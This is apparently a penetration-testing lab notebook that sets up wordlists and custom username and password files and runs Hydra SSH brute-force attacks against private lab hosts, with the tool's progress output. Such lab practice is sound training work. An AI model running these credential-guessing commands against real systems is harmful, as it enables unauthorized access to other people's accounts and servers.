{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3a88e203-44a2-49b8-ba7a-746528a5c276",
   "metadata": {
    "tags": []
   },
   "source": [
    "# SSH:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "a2442dd1-6120-4d33-be4e-b569fac16578",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TARGET=10.11.1.20\n"
     ]
    }
   ],
   "source": [
    "%env TARGET=10.11.1.20"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "43d00f9c-52eb-49b0-a36e-bba479542653",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: PL=/home/parallels/hax/SecLists/Passwords/probable-v2-top1575.txt\n",
      "env: PLRY=/usr/share/wordlists/rockyou.txt\n"
     ]
    }
   ],
   "source": [
    "%env PL=/home/parallels/hax/SecLists/Passwords/probable-v2-top1575.txt\n",
    "%env PLRY=/usr/share/wordlists/rockyou.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "9d0a4adb-f676-4ed6-985a-9008aab9164d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing custom_pass.txt\n"
     ]
    }
   ],
   "source": [
    "%%writefile custom_pass.txt\n",
    "84d0c1e0252c43c7521d817082d39806\n",
    "batteryhorsestaple"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "fc2a282c-dc6f-4a6f-bd60-253944966488",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting custom_users.txt\n"
     ]
    }
   ],
   "source": [
    "%%writefile custom_users.txt\n",
    "webadmin\n",
    "admin\n",
    "john\n",
    "quick"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a1c75d81-6ced-4b8f-a572-e765e9b2d9b2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-28 00:24:29\n",
      "[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 57377596 login tries (l:4/p:14344399), ~3586100 tries per task\n",
      "[DATA] attacking ssh://10.11.1.20:22/\n",
      "[STATUS] 285.00 tries/min, 285 tries in 00:01h, 57377315 to do in 3355:24h, 16 active\n",
      "[STATUS] 280.33 tries/min, 841 tries in 00:03h, 57376759 to do in 3411:14h, 16 active\n",
      "[STATUS] 290.29 tries/min, 2032 tries in 00:07h, 57375569 to do in 3294:13h, 16 active\n",
      "[STATUS] 282.13 tries/min, 4232 tries in 00:15h, 57373372 to do in 3389:16h, 16 active\n",
      "[STATUS] 284.45 tries/min, 8818 tries in 00:31h, 57368791 to do in 3361:23h, 16 active\n",
      "[STATUS] 271.53 tries/min, 12798 tries in 00:47h, 57364812 to do in 3521:07h, 16 active\n",
      "[STATUS] 77.61 tries/min, 12952 tries in 02:46h, 57364658 to do in 12318:50h, 16 active\n",
      "[ERROR] ssh target does not support password auth\n",
      "[ERROR] ssh target does not support password auth\n",
      "[ERROR] ssh target does not support password auth\n",
      "[ERROR] ssh target does not support password auth\n",
      "[STATUS] 36.02 tries/min, 12977 tries in 06:00h, 57364646 to do in 26543:48h, 16 active\n",
      "[STATUS] 32.51 tries/min, 13007 tries in 06:40h, 57364622 to do in 29411:44h, 16 active\n",
      "[STATUS] 28.28 tries/min, 13038 tries in 07:41h, 57364591 to do in 33810:02h, 16 active\n",
      "[STATUS] 25.50 tries/min, 13070 tries in 08:32h, 57364559 to do in 37498:08h, 16 active\n",
      "[STATUS] 24.72 tries/min, 13133 tries in 08:51h, 57364496 to do in 38669:51h, 16 active\n",
      "[STATUS] 23.78 tries/min, 13150 tries in 09:12h, 57364479 to do in 40201:11h, 16 active\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -L custom_users.txt -u -P $PLRY $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "df77a4a6-c40c-4d8d-8cf2-fb8a45438f5b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-27 18:47:55\n",
      "[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 34 login tries (l:17/p:2), ~3 tries per task\n",
      "[DATA] attacking ssh://10.11.1.17:22/\n",
      "[STATUS] 32.00 tries/min, 32 tries in 00:01h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 16.00 tries/min, 32 tries in 00:02h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 10.67 tries/min, 32 tries in 00:03h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 8.00 tries/min, 32 tries in 00:04h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 6.40 tries/min, 32 tries in 00:05h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 5.33 tries/min, 32 tries in 00:06h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 4.57 tries/min, 32 tries in 00:07h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 4.00 tries/min, 32 tries in 00:08h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 3.56 tries/min, 32 tries in 00:09h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 3.20 tries/min, 32 tries in 00:10h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 2.91 tries/min, 32 tries in 00:11h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 2.67 tries/min, 32 tries in 00:12h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 2.46 tries/min, 32 tries in 00:13h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 2.29 tries/min, 32 tries in 00:14h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 2.13 tries/min, 32 tries in 00:15h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 2.00 tries/min, 32 tries in 00:16h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.88 tries/min, 32 tries in 00:17h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.78 tries/min, 32 tries in 00:18h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.68 tries/min, 32 tries in 00:19h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.60 tries/min, 32 tries in 00:20h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.52 tries/min, 32 tries in 00:21h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.45 tries/min, 32 tries in 00:22h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.39 tries/min, 32 tries in 00:23h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.33 tries/min, 32 tries in 00:24h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.28 tries/min, 32 tries in 00:25h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.23 tries/min, 32 tries in 00:26h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.19 tries/min, 32 tries in 00:27h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.14 tries/min, 32 tries in 00:28h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.10 tries/min, 32 tries in 00:29h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.07 tries/min, 32 tries in 00:30h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.03 tries/min, 32 tries in 00:31h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.00 tries/min, 32 tries in 00:32h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.97 tries/min, 32 tries in 00:33h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.94 tries/min, 32 tries in 00:34h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.91 tries/min, 32 tries in 00:35h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.89 tries/min, 32 tries in 00:36h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.86 tries/min, 32 tries in 00:37h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.84 tries/min, 32 tries in 00:38h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.82 tries/min, 32 tries in 00:39h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.80 tries/min, 32 tries in 00:40h, 2 to do in 00:03h, 16 active\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -L /home/parallels/hax/SecLists/Usernames/top-usernames-shortlist.txt -u -P custom_pass.txt $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "adaf01c1-3b26-4285-9bb8-187d3227cdee",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-27 15:46:37\n",
      "[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task\n",
      "[DATA] attacking ssh://10.11.1.17:22/\n",
      "[STATUS] 385.00 tries/min, 385 tries in 00:01h, 28688415 to do in 1241:56h, 16 active\n",
      "[STATUS] 355.00 tries/min, 1065 tries in 00:03h, 28687735 to do in 1346:51h, 16 active\n",
      "[STATUS] 330.57 tries/min, 2314 tries in 00:07h, 28686486 to do in 1446:19h, 16 active\n",
      "[STATUS] 327.67 tries/min, 4915 tries in 00:15h, 28683885 to do in 1458:60h, 16 active\n",
      "[STATUS] 313.35 tries/min, 9714 tries in 00:31h, 28679086 to do in 1525:23h, 16 active\n",
      "[STATUS] 313.30 tries/min, 14725 tries in 00:47h, 28674075 to do in 1525:24h, 16 active\n",
      "[STATUS] 308.86 tries/min, 19458 tries in 01:03h, 28669342 to do in 1547:04h, 16 active\n",
      "[STATUS] 308.48 tries/min, 24370 tries in 01:19h, 28664430 to do in 1548:42h, 16 active\n",
      "[STATUS] 307.23 tries/min, 29192 tries in 01:35h, 28659612 to do in 1554:44h, 16 active\n",
      "^C\n",
      "The session file ./hydra.restore was written. Type \"hydra -R\" to resume session.\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -L custom_users.txt -u -P $PLRY $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e1fdd27-71ad-402a-9b11-86ef8b46beec",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
